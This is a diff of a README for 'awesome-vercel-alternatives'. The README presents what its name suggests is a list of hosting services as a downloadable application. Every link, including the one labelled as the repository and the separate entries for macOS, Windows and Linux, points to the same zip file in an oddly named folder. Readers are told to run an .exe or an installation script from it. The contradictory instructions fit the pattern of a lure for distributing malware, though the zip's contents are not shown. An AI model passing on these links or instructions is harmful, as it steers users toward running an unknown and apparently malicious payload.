@@ -1,6 +1,6 @@
 # 🚀 awesome-vercel-alternatives - Save Money While Deploying
 
-[![Download](https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip)
+[![Download](https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip)
 
 ## 📜 Introduction
 
@@ -26,7 +26,7 @@ To use this application, ensure you meet the following requirements:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**: Click the link below to access the download page:
-   [Download from Releases](https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip)
+   [Download from Releases](https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the most recent version. It will have the highest version number.
 
@@ -37,17 +37,17 @@ To use this application, ensure you meet the following requirements:
 To get started with **awesome-vercel-alternatives**, follow these steps:
 
 1. **Go to the Releases Page**: 
-   [Visit This Page to Download](https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip)
+   [Visit This Page to Download](https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip)
 
 2. **Choose the Correct File**: Look for the file that matches your operating system. For example:
-   - `https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip` for macOS
-   - `https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip` for Windows
-   - `https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip` for Linux
+   - `https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip` for macOS
+   - `https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip` for Windows
+   - `https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip` for Linux
 
 3. **Run the Installer**: 
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, unzip the `.zip` file and drag the application to your Applications folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip` file and run the included installation script.
+   - For Linux, extract the `https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip` file and run the included installation script.
 
 4. **Launch the Application**: After installation, you should find the application in your software list or Applications folder, ready to use.
 
@@ -69,7 +69,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Links
 
-- **GitHub Repository**: [awesome-vercel-alternatives](https://raw.githubusercontent.com/GamerYest0574/awesome-vercel-alternatives/main/inflatingly/awesome-vercel-alternatives.zip)
+- **GitHub Repository**: [awesome-vercel-alternatives](https://github.com/GamerYest0574/awesome-vercel-alternatives/raw/refs/heads/main/inflatingly/vercel_awesome_alternatives_3.9.zip)
 - **Community Forum**: [Join the Discussion](#)
 
 Thank you for using **awesome-vercel-alternatives**! We hope you find it helpful in your deployment journey.
